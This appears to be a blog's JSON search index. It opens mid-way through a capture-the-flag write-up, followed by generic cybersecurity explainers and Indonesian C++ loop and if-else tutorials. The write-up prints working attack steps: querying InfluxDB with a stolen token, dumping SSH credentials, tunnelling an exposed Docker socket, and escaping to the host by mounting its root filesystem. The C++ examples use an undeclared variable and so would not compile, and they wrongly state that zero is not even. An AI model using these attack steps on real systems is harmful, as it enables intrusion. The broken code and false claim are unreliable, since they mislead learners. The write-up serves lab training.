eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ&quot; -X POST --data-urlencode &quot;db=tanks&quot; --data-urlencode &quot;q=select * from water_tank&quot; | jqQuestion 3’s answer can be found in the mixer database, in the mixer_stats bucket.curl -s &#39;http://10.10.243.165:8086/query&#39; -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ&quot; -X POST --data-urlencode &quot;db=mixer&quot; --data-urlencode &quot;q=select * from mixer_stats&quot; | jqQuestion 4 can be found in the creds database, in the ssh bucket.curl -s &#39;http://10.10.243.165:8086/query&#39; -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzI3Mzg4NDAzfQ.EmsmI208Oc2CNoiICnC3T4ftmwbJygAZkECpjam4PXQ&quot; -X POST --data-urlencode &quot;db=creds&quot; --data-urlencode &quot;q=select * from ssh&quot; | jq{ &quot;results&quot;: [ { &quot;statement_id&quot;: 0, &quot;series&quot;: [ { &quot;name&quot;: &quot;ssh&quot;, &quot;columns&quot;: [ &quot;time&quot;, &quot;pw&quot;, &quot;user&quot; ], &quot;values&quot;: [ [ &quot;2021-05-16T12:00:00Z&quot;, 7788764472, &quot;uzJk6Ry98d8C&quot; ] ] } ] } ]}We now have some credentials that looks to be the ssh credentials?username: uzJk6Ry98d8Cpassword: 7788764472Let’s try use the creds to login via SSHssh uzJk6Ry98d8C@10.10.243.165 -p 2222uzJk6Ry98d8C@10.10.243.165&#39;s password: The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue Jul 27 21:05:14 2021 from ip-10-8-18-252.eu-west-1.compute.internaluzJk6Ry98d8C@76b4f9ebadf9:~$ We also find the user.txt flaguzJk6Ry98d8C@76b4f9ebadf9:~$ ls -lsatotal 244 drwxr-xr-x 4 uzJk6Ry98d8C uzJk6Ry98d8C 4096 Jul 27 19:57 .4 drwxr-xr-x 7 root root 4096 Jul 27 19:56 ..0 lrwxrwxrwx 1 uzJk6Ry98d8C uzJk6Ry98d8C 9 May 18 14:50 .bash_history -&amp;gt; /dev/null4 drwxr-xr-x 7 uzJk6Ry98d8C uzJk6Ry98d8C 4096 Jul 27 19:57 data4 -rw-r--r-- 1 uzJk6Ry98d8C uzJk6Ry98d8C 527 Jul 27 19:57 meta.db4 -rw-r--r-- 1 uzJk6Ry98d8C uzJk6Ry98d8C 22 May 18 14:50 user.txt4 drwx------ 7 uzJk6Ry98d8C uzJk6Ry98d8C 4096 Jul 27 19:57 walTASK 4 - Privilege escalationNow we need to find /root/root.txtFirst thing I noticed was that we were in a docker image and that there was the following process running from a ps -efuzJk6Ry+ 6941 16 0 19:57 ? 00:00:00 socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.socksocat was exposing /var/run.docker.sock on port 8080.Having this exposed allows us to query Docker.We do not have the Docker command available on the remote machine so the easiest way to do this would be to leverage this by using SSH port forwarding to my machine to expose port 8080. We would need to make sure we have the Docker CLI tools available on our own machine.Let us setup the tunnel.ssh -L 8080:localhost:8080 uzJk6Ry98d8C@10.10.243.165 -p 2222Now we can use the Docker command to communicate with the Docker instance.Let’s see what we haveDocker Imagescurl -s http://127.0.0.1:8080/images/json | jq [ { &quot;Containers&quot;: -1, &quot;Created&quot;: 1621349458, &quot;Id&quot;: &quot;sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e&quot;, &quot;Labels&quot;: {}, &quot;ParentId&quot;: &quot;sha256:213cc0db00922f32cf219291c2f81dfd410304b093a44703927a1db630d7722d&quot;, &quot;RepoDigests&quot;: null, &quot;RepoTags&quot;: [ &quot;sweettoothinc:latest&quot; ], &quot;SharedSize&quot;: -1, &quot;Size&quot;: 358659530, &quot;VirtualSize&quot;: 358659530 }, { &quot;Containers&quot;: -1, &quot;Created&quot;: 1499487353, &quot;Id&quot;: &quot;sha256:e1b5eda429c335c11c07ea85e63f8a60518af69212f19fe50a2a28717744b384&quot;, &quot;Labels&quot;: {}, &quot;ParentId&quot;: &quot;&quot;, &quot;RepoDigests&quot;: [ &quot;influxdb@sha256:99ef42027ac794b038ceb829537e92881e7648fa8c62c89ce84531d69177a635&quot; ], &quot;RepoTags&quot;: [ &quot;influxdb:1.3.0&quot; ], &quot;SharedSize&quot;: -1, &quot;Size&quot;: 227323286, &quot;VirtualSize&quot;: 227323286 }]Docker Containerscurl -s http://127.0.0.1:8080/containers/json | jq[ { &quot;Id&quot;: &quot;76b4f9ebadf90b163a385bfa469fc108b5993f27720011ab01877a1391e15ba1&quot;, &quot;Names&quot;: [ &quot;/sweettoothinc&quot; ], &quot;Image&quot;: &quot;sweettoothinc:latest&quot;, &quot;ImageID&quot;: &quot;sha256:26a697c0d00f06d8ab5cd16669d0b4898f6ad2c19c73c8f5e27231596f5bec5e&quot;, &quot;Command&quot;: &quot;/bin/bash -c &#39;chmod a+rw /var/run/docker.sock &amp;amp;&amp;amp; service ssh start &amp;amp; /bin/su uzJk6Ry98d8C -c &#39;/initializeandquery.sh &amp;amp; /entrypoint.sh influxd&#39;&#39;&quot;, &quot;Created&quot;: 1627415793, &quot;Ports&quot;: [ { &quot;IP&quot;: &quot;0.0.0.0&quot;, &quot;PrivatePort&quot;: 22, &quot;PublicPort&quot;: 2222, &quot;Type&quot;: &quot;tcp&quot; }, { &quot;IP&quot;: &quot;0.0.0.0&quot;, &quot;PrivatePort&quot;: 8086, &quot;PublicPort&quot;: 8086, &quot;Type&quot;: &quot;tcp&quot; } ], &quot;Labels&quot;: {}, &quot;State&quot;: &quot;running&quot;, &quot;Status&quot;: &quot;Up About an hour&quot;, &quot;HostConfig&quot;: { &quot;NetworkMode&quot;: &quot;default&quot; }, &quot;NetworkSettings&quot;: { &quot;Networks&quot;: { &quot;bridge&quot;: { &quot;IPAMConfig&quot;: null, &quot;Links&quot;: null, &quot;Aliases&quot;: null, &quot;NetworkID&quot;: &quot;7155b0990f259c3601099d66c948d42fea5711895942c368eb5517702643b43b&quot;, &quot;EndpointID&quot;: &quot;38fa09a0d58d1edd41e683f825c7b2286e543621962463c95af173202f36e4ea&quot;, &quot;Gateway&quot;: &quot;172.17.0.1&quot;, &quot;IPAddress&quot;: &quot;172.17.0.2&quot;, &quot;IPPrefixLen&quot;: 16, &quot;IPv6Gateway&quot;: &quot;&quot;, &quot;GlobalIPv6Address&quot;: &quot;&quot;, &quot;GlobalIPv6PrefixLen&quot;: 0, &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;, &quot;DriverOpts&quot;: null } } }, &quot;Mounts&quot;: [ { &quot;Type&quot;: &quot;volume&quot;, &quot;Name&quot;: &quot;835c5e630755f761ee0093608569c65217b8cab8a7343d2bfdbdc3dae365e1e4&quot;, &quot;Source&quot;: &quot;&quot;, &quot;Destination&quot;: &quot;/var/lib/influxdb&quot;, &quot;Driver&quot;: &quot;local&quot;, &quot;Mode&quot;: &quot;&quot;, &quot;RW&quot;: true, &quot;Propagation&quot;: &quot;&quot; }, { &quot;Type&quot;: &quot;bind&quot;, &quot;Source&quot;: &quot;/var/run/docker.sock&quot;, &quot;Destination&quot;: &quot;/var/run/docker.sock&quot;, &quot;Mode&quot;: &quot;&quot;, &quot;RW&quot;: true, &quot;Propagation&quot;: &quot;rprivate&quot; } ] }]We have two docker images.sweettoothinc and influxdb:1.3.0I went down a rabbit hole with an article I read &quot;Escaping the Whale&quot; and was trying to use that method to access the containers with not much luck but it was by far easier than that.We can actually just run the following command to access the sweettoothinc instance.docker -H localhost:8080 exec -it sweettoothinc sh# cd /root # ls -lsatotal 244 drwx------ 4 root root 4096 May 18 14:50 .4 drwxr-xr-x 62 root root 4096 Jul 27 21:05 ..4 -rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc4 drwx------ 2 root root 4096 Jul 8 2017 .gnupg4 -rw-r--r-- 1 root root 140 Nov 19 2007 .profile4 -rw-r--r-- 1 root root 22 May 18 14:50 root.txtTASK 5 - Escape!For the final /root/root.txt we needed just to access the other container.docker -H localhost:8080 run -v /:/mnt/ --rm -it influxdb:1.3.0 chroot /mnt sh# cd /root# ls -lsatotal 284 drwx------ 2 root root 4096 May 18 10:59 .4 drwxr-xr-x 22 root root 4096 May 15 08:37 ..0 lrwxrwxrwx 1 root root 9 May 15 14:17 .bash_history -&amp;gt; /dev/null4 -rw-r--r-- 1 root root 570 Jan 31 2010 .bashrc4 -rw-r--r-- 1 root root 140 Nov 19 2007 .profile4 -rw-r--r-- 1 root root 66 May 15 14:15 .selected_editor4 -rw------- 1 root root 1611 May 15 08:36 .viminfo4 -rw-r--r-- 1 root root 22 May 15 12:15 root.txt# All in all it was a fun little challenge and spent some time reading and going down rabbit holes which I can see now, I tend to overthink things." }, { "title": "what is cybersecurity", "url": "/what-is-cybersecurity/", "categories": "cybersecurity, network security", "tags": "cybersecurity, malware, Network Security, Data Loss Prevention (DLP), Cloud Security, trusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS), Identity and Access Management (IAM) use, Antivirus/anti-malware, Ransomware, Phishing Attacks, Social engineering, Advanced Persistent Threat", "date": "2021-07-27 07:00:00 +0700", "snippet": "Cybersecurity definedAlso referred to as an information security, the cybersecurity refers to the practice of ensuring the integrity, a confidentiality, and availability (ICA) of information. Cybersecurity consists of evolving a set of tools, risk management approaches, technologies, training, and best practices designed to protect networks, devices, programs, and data from attacks or unauthorized access.Why is cybersecurity important?The world relies on a technology more than ever before. As a result, digital data creation has surged. A today, businesses and governments store a great deal of that data on computers and transmit it across networks to other computers. Devices and their underlying systems have vulnerabilities that, when exploited, undermine the health and objectives of an organization.A data breach can have a range of devastating consequences for any business. It can unravel a company’s reputation through the loss of consumer and partner trust. The loss of critical data, such as source files or intellectual property, can cost a company its competitive advantage. Going further, a data breach can impact corporate revenues due to non-compliance with data protection regulations. It’s estimated that, on average, a data breach costs an affected organization $3.6 million. With high-profile data breaches making media headlines, it’s essential that organizations adopt and implement a strong cybersecurity approach.Common types of cybersecurity Network Security protects network traffic by controlling incoming and outgoing connections to prevent threats from entering or spreading on the network. Data Loss Prevention (DLP) protects data by focusing on the location, classification and monitoring of information at rest, in use and in motion. Cloud Security provides protection for data used in cloud-based services and applications. Intrusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS) work to identify potentially hostile cyber activity. Identity and Access Management (IAM) use authentication services to limit and track employee access to protect internal systems from malicious entities. Encryption is the process of encoding data to render it unintelligible, and is often used during data transfer to prevent theft in transit. Antivirus/anti-malware solutions scan computer systems for known threats. Modern solutions are even able to detect previously unknown threats based on their behavior.Common types of cyber threats Malware – Malicious software such as computer viruses, spyware, Trojan horses, and keyloggers. Ransomware – Malware that locks or encrypts data until a ransom is paid. Phishing Attacks – The practice of obtaining sensitive information (e.g., passwords, credit card information) through a disguised email, phone call, or text message. Social engineering – The psychological manipulation of individuals to obtain confidential information; often overlaps with phishing. *Advanced Persistent Threat – An attack in which an unauthorized user gains access to a system or network andremains there for an extended period of time without being detected. Cybersecurity is constantly evolvingTraditional cybersecurity is centered around the implementation of defensive measures around defined the perimeter. Recent enablement initiatives like remote workers and Bring Your Own Device (BYOD) policies have dissolved the perimeter, reduced visibility into a cyber activity, and expanded the attack surface..The today, breaches are increasing at a rapid pace despite record levels of security spending. Global organizations are turning to human-centric cybersecurity, a new approach that places focus on changes in user behavior instead of an exponential number of growing threats. Founded on behavior analytics, human-centric cybersecurity provides an insight into how an end-user interacts with data and extends security controls into all the systems where data reside, even if not exclusively controlled by the organization. Ultimately, this approach is designed to identify behavioral anomalies in order to surface and prioritize the most serious threats, reducing investigation and threat detection times." }, { "title": "What is Network Security?", "url": "/what-is-Network-security/", "categories": "cybersecurity, Network security", "tags": "cybersecurity, malware, Network Security, Data Loss Prevention (DLP), Cloud Security, trusion Detection Systems (IDS) or Intrusion Prevention Systems (IPS), Identity and Access Management (IAM) use, Antivirus/anti-malware, Ransomware, Phishing Attacks, Social engineering, Advanced Persistent Threat, network security, Firewalls, Forcepoint's Secure Enterprise SD-WAN, Administrative, Physical, Technical", "date": "2021-07-27 07:00:00 +0700", "snippet": "Network security definedNetwork security is a broad term that covered a multitude of technologies, devices and processes. In its simplest term, it is a set of rules and configurations designed to protect the integrity, a confidentiality and accessibility of computer networks and data using both software and hardware technologies. Every organization, regardless of the size, an industry or an infrastructure, requires a degree of a network security solutions in a place to protect it from the ever-growing a landscape of cyber threats in the wild today.Today’s network architecture is complex and is faced with a threat environment that is always changing and attackers that are always trying to find and exploit vulnerabilities. These vulnerabilities can exist in a broad number of areas, including devices, data, applications, users and locations. For this reason, there are many network security management tools and applications in use today that address individual threats and exploits and also regulatory non-compliance. When just a few minutes of downtime can cause widespread disruption and massive damage to an organization’s bottom line and reputation, it is essential that these protection measures are in place.How does network security work?There are many layers to consider when addressing network security across an organization. Attacks can happen at any layer in the network security layers model, so your network security hardware, software and policies must be designed to address each area.Network security typically consists of three different controls: physical, technical and administrative. Here is a brief description of the different types of network security and how each control works.Physical Network SecurityPhysical security controls are designed to prevent unauthorized personnel from gaining physical access to network components such as routers, cabling cupboards and so on. Controlled access, such as locks, biometric authentication and other devices, is essential in any organization.Technical Network SecurityTechnical security controls protect data that is stored on the network or which is in transit across, into or out of the network. Protection is twofold; it needs to protect data and systems from unauthorized personnel, and it also needs to protect against malicious activities from employees.Administrative Network SecurityAdministrative security controls consist of security policies and processes that control user behavior, including how users are authenticated, their level of access and also how IT staff members implement changes to the infrastructure.Types of network securityWe have talked about the different types of network security controls. Now let’s take a look at some of the different ways you can secure your network.Network Access ControlTo ensure that potential attackers cannot infiltrate your network, comprehensive access control policies need to be in place for both users and devices. Network access control (NAC) can be set at the most granular level. For example, you could grant administrators full access to the network but deny access to specific confidential folders or prevent their personal devices from joining the network.Antivirus and Antimalware SoftwareAntivirus and antimalware software protect an organization from a range of malicious software, including viruses, ransomware, worms and trojans. The best software not only scans files upon entry to the network but continuously scans and tracks files.Firewall ProtectionFirewalls, as their name suggests, act as a barrier between the untrusted external networks and your trusted internal network. Administrators typically configure a set of defined rules that blocks or permits traffic onto the network. For example, Forcepoint’s Next Generation Firewall (NGFW) offers seamless and centrally managed control of network traffic, whether it is physical, virtual or in the cloud.Virtual Private NetworksVirtual private networks (VPNs) create a connection to the network from another endpoint or site. For example, users working from home would typically connect to the organization’s network over a VPN. Data between the two points is encrypted and the user would need to authenticate to allow communication between their device and the network. Forcepoint’s Secure Enterprise SD-WAN allows organizations to quickly create VPNs using drag-and-drop and to protect all locations with our Next Generation Firewall solution.Network security for businesses and consumersNetwork security should be a high priority for any organization that works with networked data and systems. In addition to protecting assets and the integrity of data from external exploits, network security can also manage network traffic more efficiently, enhance network performance and ensure secure data sharing between employees and data sources.There are many tools, applications and utilities available that can help you to secure your networks from attack and unnecessary downtime. Forcepoint offers a suite of network security solutions that centralize and simplify what are often complex processes and ensure robust network security is in place across your enterprise." }, { "title": "C++ while dan do while Loop", "url": "/cpp-while-dan-do-while-loop/", "categories": "Programming CPP, CPP Flow Control, C++ while dan do while Loop", "tags": "Programming, C++, for, while, do while, initialization, condition, true_, false_, update, array, int, collection, variable, char, looping, positive, negative", "date": "2021-07-27 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan mempelajari penggunaan while dan do… while dalam pemrograman C++ dengan bantuan beberapa contoh.Dalam pemrograman komputer, loop digunakan untuk mengulang blok kode.Sebagai contoh, katakanlah kita ingin menampilkan pesan sebanyak 100 kali. Kemudian alih-alih menulis pernyataan print 100 kali, kita bisa menggunakan loop.Itu hanya contoh sederhana; kami dapat mencapai lebih banyak efisiensi dan kecanggihan dalam program kami dengan memanfaatkan loop secara efektif.Ada 3 jenis loop dalam C++. for loop while loop do while loopPada tutorial sebelumnya, kita telah membahas tentang C++ for loop . Di sini, kita akan membahas tentang while dan do while loop.C++ while loopSyntax while loopnya adalah:while (condition) { // body dari loop}Di Sini, Sebuah while loop mengevaluasi condition Jika condition mengevaluasi ke true, code di dalam while loop dieksekusi. condition dievaluasi lagi. Proses ini berlanjut sampai condition adalah false.Ketika condition mengevaluasi ke false, loop berakhir.Flowchart dari while LoopFlowchart dari C++ while loopContoh 1: Tampilkan Angka dari 1 hingga 5// Program C++ untuk print angka dari 1 hingga 5#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int i = 1; // while loop dari 1 ke 5 while (i &amp;lt;= 5) { cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &quot; &quot;; ++i; } return 0;}Output1 2 3 4 5Berikut adalah cara kerja program. looping Variable i &amp;lt;= 5 Tindakan 1 i = 1 true 1 diprint dan i ditingkatkan menjadi 2. ke-2 i = 2 true 2 diprint dan i ditingkatkan menjadi 3. ke-3 i = 3 true 3 diprint dan i ditingkatkan menjadi 4 tanggal 4 i = 4 true 4 diprint dan i ditingkatkan menjadi 5. tanggal 5 i = 5 true 5 diprint dan i ditingkatkan menjadi 6. tanggal 6 i = 6 false Loop dihentikan Contoh 2: Jumlah angka Positive Saja// program mencari jumlah angka positive// jika user memasukkan angka negative, loop berakhir// angka negative yang dimasukkan tidak ditambahkan ke jumlah#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int angka; int jumlah = 0; // mengambil masukan dari user cout &amp;lt;&amp;lt; &quot;Masukkan sebuah angka: &quot;; cin &amp;gt;&amp;gt; angka; while (angka &amp;gt;= 0) { // tambahkan semua angka posistive sum += angka; // ambil input lagi jika angkanya positive cout &amp;lt;&amp;lt; &quot;Masukkan sebuah angka: &quot;; cin &amp;gt;&amp;gt; angka; } // tampilkan jumlah cout &amp;lt;&amp;lt; &quot;\\nJumlahnya adalah &quot; &amp;lt;&amp;lt; jumlah &amp;lt;&amp;lt; endl; return 0;}OutputMasukkan sebuah angka: 6Masukkan sebuah angka: 12Masukkan sebuah angka: 7Masukkan sebuah angka: 0Masukkan sebuah angka: -2Jumlahnya adalah 25Dalam program ini, user diminta untuk memasukkan angka, yang disimpan dalam variable angka.Untuk menyimpan jumlah angka, kita mendeklarasikan variable jumlah dan inisialisasi ke nilai 0.while Loop berlanjut sampai user memasukkan angka negative. Selama setiap iterasi, angka yang dimasukkan oleh user ditambahkan ke variable jumlah .Ketika user memasukkan angka negative, loop berakhir. Akhirnya, jumlah total ditampilkan.C++ do while Loopdo while Loop adalah varian dari while dengan satu perbedaan penting: body do while loop dieksekusi sekali sebelum condition diperiksa.Syntaxnya adalah:do { // body dari loop;}while (condition);Di Sini, body loop dieksekusi pada awalnya. Kemudian condition dievaluasi. Jika condition mengevaluasi ke true, body loop di dalam statement do dieksekusi lagi. condition dievaluasi sekali lagi. Jika condition mengevaluasi ke true, body loop di dalam statement do dieksekusi lagi. Proses ini berlanjut sampai condition evaluasi ke false. Kemudian loop berhenti.Flowchart do while LoopFlowchart dari C++ do…while loopContoh 3: Menampilkan Angka dari 1 hingga 5// Program C++ untuk print angka dari 1 hingga 5#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int i = 1; // do...while loop dari 1 hinggga 5 do { cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &quot; &quot;; ++i; } while (i &amp;lt;= 5); return 0;}Output1 2 3 4 5Berikut adalah cara kerja program. looping Variable i &amp;lt;= 5 Tindakan kosong i = 1 tidak dipriksa 1 diprint dan id itingkatkan menjadi 2 1 i = 2 true 2 diprint dan i ditingkatkan menjadi 3 ke-2 i = 3 true 3 diprint dan i ditingkatkan menjadi 4 ke-3 i = 4 true 4 diprint dan i ditingkatkan menjadi 5 4th i = 5 true 5 diprint dan i ditingkatkan menjadi 6 tanggal 5 i = 6 false Loop dihentikan Contoh 4: Jumlah anngka Positive Saja// program mencari jumlah bilangan positive// Jika user memasukkan angka negative, loop berakhir// angka negative yang dimasukkan tidak ditambahkan ke jumlah#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int angka = 0; int jumlah = 0; do { sum += angka; // mengambil masukan dari user cout &amp;lt;&amp;lt; &quot;Masukkan sebuah angka: &quot;; cin &amp;gt;&amp;gt; angka; } while (angka &amp;gt;= 0); // tampilkan jumlah cout &amp;lt;&amp;lt; &quot;\\nJumlahnya adalah&quot; &amp;lt;&amp;lt; jumlah &amp;lt;&amp;lt; endl; return 0;}Output 1Masukkan sebuah angka: 6Masukkan sebuah angka: 12Masukkan sebuah angka: 7Masukkan sebuah angka: 0Masukkan sebuah angka: -2Jumlahnya adalah 25Di sini, do while loop berlanjut hingga user memasukkan angka negative. Ketika angkanya negative, loop berakhir; angka negative tidak ditambahkan ke variable jumlah.Output 2Masukkan nomor: -6Jumlahnya adalah 0.body do while loop hanya berjalan sekali jika user memasukkan angka negative.while loop Tak terbatasJika condition loop selalu true, loop berjalan untuk waktu yang tak terbatas (sampai memori penuh). Sebagai contoh,// while loop Tak terbataswhile(true) { // body dari loop}Berikut adalah contoh do while loop tak terbatas.// do while loop Tak terbatasint count = 1;do { // body dari loop} while(count == 1);Dalam program di atas, condition selalu true. Oleh karena itu, body loop akan berjalan untuk waktu yang tak terbatas.for vs while loopSebuah for loop biasanya digunakan ketika jumlah iterasi diketahui. Sebagai contoh,// Loop ini diulang 5 kalifor (int i = 1; i &amp;lt;=5; ++i) { // body dari loop}Di sini, kita tau bahwa for-loop akan dieksekusi 5 kali.Namun, while dan do while loop biasanya digunakan ketika jumlah iterasi tidak diketahui. Sebagai contoh,while (condition) { // body dari loop}" }, { "title": "C++ if else dan if else Bersarang", "url": "/cpp-if-else-dan-if-else-bersarang/", "categories": "Programming CPP, CPP Flow Control, C++ if else dan if else Bersarang", "tags": "Programming, C++, if Statement, condition, true_, false_, if else, if else Statement, else if, if else Bersarang, if Bersarang, inner, outer", "date": "2021-07-27 07:00:00 +0700", "snippet": "Dalam tutorial ini, kita akan belajar tentang Statement if else untuk membuat program pengambilan keputusan dengan bantuan contoh.Dalam pemrograman komputer, kami menggunakan Statement if untuk menjalankan code block hanya ketika kondisi tertentu.Misalnya, pemberian nilai (A, B, C) berdasarkan nilai yang diperoleh seorang siswa.. jika persentasenya di atas 90, berikan nilai A jika persentasenya di atas 75, berikan nilai B jika persentasenya di atas 65, berikan nilai CAda tiga bentuk Statement if else dalam C++. Statement if Statement if else Statement if else if elseC++ if StatementSyntax dari Statement if tersebut adalah:if (condition) { // body dari statement if}Statement if mengevaluasi dalam condition tanda kurung ( ). Jika code condition mengevaluasi ke true, code di dalam body if di eksekusi. Jika code condition mengevaluasi ke false, code di dalam body if akan dilewati. Catatan: code di dalam { } adalah isi statement ifContoh 1: C++ if Statement// Program untuk print integer positive yang dimasukkan oleh user// Jika user memasukkan angka negative, akan dilewati#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int angka; cout &amp;lt;&amp;lt; &quot;Masukan sebuah integer: &quot;; cin &amp;gt;&amp;gt; angka; if (angka &amp;gt; 0) { cout &amp;lt;&amp;lt; &quot;Anda memasukkan sebuah integer: &quot; &amp;lt;&amp;lt; angka &amp;lt;&amp;lt; endl; } cout &amp;lt;&amp;lt; &quot;Statement ini selalu dieksekusi.&quot;; return 0;}Output 1Masukkan sebuah integer: 5Anda memasukkan angka positive: 5Statement ini selalu dieksekusi.Ketika 5 user masuk, kondisi angka &amp;gt; 0 dievaluasi true dan Statement di dalam body if di eksekusi.Output 2Masukkan angka: -5Statement ini selalu dieksekusi.Ketika -5 user masuk kondisi angka &amp;gt; 0 dievaluasi false dan Statement di dalam body if tidak dieksekusi.C++ if elseStatement if dapat memiliki opsional else. Syntaxnya adalah:if (condition) { // block dari code if condition adalah true}else { // block dari code if condition adalah false}Statement if..else mengevaluasi condition dalam kurung.Jika code condition mengevaluasi true, code di dalam body if di eksekusi code di dalam body else dilwati dari eksekusiJika code condition mengevaluasi false, code di dalam body else dieksekusi code di dalam body if dilewati dari eksekusiContoh 2: C++ Statement if else// Program untuk memeriksa apakah integer positive atau negative// Program ini menganggap angka 0 positive#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int angka; cout &amp;lt;&amp;lt; &quot;Masukkan sebuah integer: &quot;; cin &amp;gt;&amp;gt; angka; if (angka &amp;gt;= 0) { cout &amp;lt;&amp;lt; &quot;Anda memasukkan integer positive: &quot; &amp;lt;&amp;lt; angka &amp;lt;&amp;lt; endl; } else { cout &amp;lt;&amp;lt; &quot;Anda memasukkan integer negative: &quot; &amp;lt;&amp;lt; angka &amp;lt;&amp;lt; endl; } cout &amp;lt;&amp;lt; &quot;Baris ini selalu diprint.&quot;; return 0;}Output 1Masukkan sebuah integer: 4Anda memasukkan integer positive: 4.Baris ini selalu diprint.Dalam program di atas, kita memiliki condition angka &amp;gt;= 0. Jika kita memasukkan angka yang lebih besar atau sama dengan 0, maka condition dievaluasi true.Di sini, kita masuk 4. Jadi, syaratnya adalah true. Oleh karena itu, Statement di dalam body if di eksekusi.Output 2Masukkan integer: -4Anda memasukkan integer negatif: -4.Baris ini selalu diprint.Di sini, kita masuk -4. Jadi, syaratnya adalah false. Oleh karena itu, Statement di dalam body else dieksekusi.C++ if else, else if StatementStatement if else digunakan untuk mengeksekusi block code antara dua alternatif. Namun, jika kita perlu membuat pilihan di antara lebih dari dua alternatif, kita menggunakan Statement if else if else.Syntax dari if else if else Statement tersebut adalah:if (condition1) { // code block 1}else if (condition2){ // code block 2}else { // code block 3}Di Sini, Jika condition1 bernilai true, maka code block 1 dieksekusi. Jika condition1 bernilai false, maka condition2 dievaluasi. Jika condition2 adalah true, yang code block 2 dijalankan. Jika condition2 adalah false, yang code block 3 dijalankan. Catatan: Boleh lebih dari satu else if Statement tetapi hanya satu if dan Statement else.Contoh 3: C++ if else, else if// Program untuk memeriksa apakah integer positif, negatif atau 0#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int angka; cout &amp;lt;&amp;lt; &quot;Masukkan sebuah integer: &quot;; cin &amp;gt;&amp;gt; angka; if (angka &amp;gt; 0) { cout &amp;lt;&amp;lt; &quot;Anda memasukkan integer positive: &quot; &amp;lt;&amp;lt; angka &amp;lt;&amp;lt; endl; } else if (angka &amp;lt; 0) { cout &amp;lt;&amp;lt; &quot;Anda memasukkan integer negative: &quot; &amp;lt;&amp;lt; angka &amp;lt;&amp;lt; endl; } else { cout &amp;lt;&amp;lt; &quot;Anda memasukkan 0.&quot; &amp;lt;&amp;lt; endl; } cout &amp;lt;&amp;lt; &quot;Baris ini selalu diprint.&quot;; return 0;}Output 1Masukkan sebuah integer: 1Anda memasukkan integer positive: 1.Baris ini selalu diprint.Output 2Masukkan sebuah integer: -2Anda memasukkan integer negative: -2.Baris ini selalu diprint.Output 3Masukkan sebuah integer: 0Anda memasukkan 0.Baris ini selalu diprint.Dalam program ini, kita mengambil angka dari user. kemudian menggunakan if else if else untuk memeriksa apakah angkanya positive, negative, atau 0.Jika jumlahnya lebih besar dari 0, code di dalam block if dieksekusi. Jika jumlahnya kurang dari 0, code di dalam block else if akan dieksekusi. Jika tidak, code di dalam block else akan dieksekusi.C++ if else BersarangTerkadang, kita perlu menggunakan Statement if di dalam Statement if lain . Ini dikenal sebagai if else Bersarang.Anggap saja sebagai beberapa lapisan statement if Ada if Statement, dan di dalamnya ada if Statement lainnya . Syntaxnya adalah:// if statement luarif (condition1) { // statement // if statement dalam if (condition2) { // statement }} Catatan:Kita dapat menambahkan else dan else if Statement ke if Statement dalam sesuai kebutuhan.Statement if dalam juga dapat disisipkan di dalam Statement luar else atau else if (jika ada).Kita dapat membuat banyak lapisan statement ifContoh 4: C++ if Bersarang// Program C++ untuk mengetahui apakah suatu sebuah integer adalah genap atau ganjil atau tidak keduanya (0)// menggunakan statements if Bersarang#include &amp;lt;iostream&amp;gt;using namespace std;int main() { int num; cout &amp;lt;&amp;lt; &quot;Masukan sebuah integer: &quot;; cin &amp;gt;&amp;gt; num; // luar if condition if (num != 0) { // dalam if condition if ((num % 2) == 0) { cout &amp;lt;&amp;lt; &quot;Jumlahnya genap.&quot; &amp;lt;&amp;lt; endl; } // bagian dalam else condition else { cout &amp;lt;&amp;lt; &quot;Nomornya ganjil.&quot; &amp;lt;&amp;lt; endl; } } // luar else condition else { cout &amp;lt;&amp;lt; &quot;Bilangannya 0 dan bukan genap maupun ganjil.&quot; &amp;lt;&amp;lt; endl; } cout &amp;lt;&amp;lt; &quot;Baris ini selalu diprint.&quot; &amp;lt;&amp;lt; endl;}Output 1Masukan sebuah integer: 34Jumlahnya genap.Baris ini selalu diprint.Output 2Masukkan sebuah integer: 35Jumlahnya ganjil.Baris ini selalu diprint.Output 3Masukkan sebuah integer: 0Bilangannya adalah 0 dan tidak genap maupun ganjil.Baris ini selalu diprint.Dalam contoh di atas, kita mengambil integer sebagai input dari user dan menyimpannya ke dalam variable num kita kemudian menggunakan Statement if else untuk memeriksa apakah num tidak sama dengan 0. Jika true, maka Statement dalam if else akan dieksekusi. ika false, code di dalam luar condition else dijalankan, yang menampilkan “Angkanya adalah 0 dan tidak genap maupun ganjil.” bagian dalam Statement if else cek apakah jumlah input habis dibagi 2. Jika true, maka kita akan mencetak Statement yang menyatakan bahwa bilangan tersebut genap. Jika false, kita print bahwa jumlahnya ganjil. Perhatikan bahwa 0 juga habis dibagi 2, tetapi sebenarnya bukan bilangan genap. 